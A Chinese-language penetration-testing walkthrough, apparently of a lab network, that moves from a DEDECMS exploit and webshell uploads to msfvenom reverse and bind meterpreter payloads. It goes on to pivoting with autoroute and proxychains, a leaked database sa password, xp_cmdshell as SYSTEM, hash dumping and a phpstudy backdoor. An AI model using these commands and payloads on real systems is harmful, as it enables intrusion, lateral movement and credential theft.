DEDECMS是存在一个sql注入漏洞，由于时间太慢，我直接跳过

通过DEDECMS漏洞，获得管理员密码，在文件式管理器处可以上传文件。上传一个冰蝎马进行连接

执行命令，shell_exec被禁用

发现该系统存在ASP环境，上传一个aspx的木马使用冰蝎自带的反弹shell，发现连接不稳定

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=6666 -f exe > shell.exe

所以重新上传了一个aspx的大马，找到C:\windows\Temp目录下上传一个msf的后门程序执行。一般情况下temp目录是有权限的

找到后渗透模块的扫描提权脚本进行探测

配置到session，执行

这里只扫描到了ms10_092，但是也不能用。。。

run autoroute -s 10.10.10.0/24

vim /etc/proxychinas

02

第二层内网

添加好代理之后，通过本地代理，或者使用msf的后渗透模块，对二层进行扫描端口。开放了136，135是本地

136这台机器是ww2.cc123.com，ww2.cc123.com中登录处存在了sql注入

sql注入太慢了。通过文件浏览，找到了数据库ww2.cc123.com连接数据库服务器的账号密码，这里是站库分离

server=WIN-JJU7KU45PN7;database=grcms_data;uid=sa;pwd=!@#a123..

使用new.cc123.com上的大马连接数据库

可以执行使用XP_cmdshell执行系统命令，数据库服务器的IP地址就是1.128和10.136的地址

查看当前权限，是SYSTEM

由于目标环境不出网，而且kali不可达，使用正向连接添加了路由之后，绑定socks，设置本地的代理

msfvenom -p windows/meterpreter/bind_tcp LPORT=13777 -f exe > bind.exe

use expolit/multi/handler

set payload windows/meterpreter/bind_tcp

set RHOST 10.10.10.136

set LPORT 13777

上传刚才的bind.exe到目标服务器

本地设置正向连接

获得shell，看到他还有一个网卡ip为10.10.1.128

当前权限是system

可以看到这条连接是从135这台机器过去的

抓取hash

后门漏洞介绍，版本有5.2.17、5.4.45

自己编写了一个phpstudy后门漏洞利用工具

然后写入一句话木马，可以访问后，使用工具进行连接

使用蚁剑连接成功
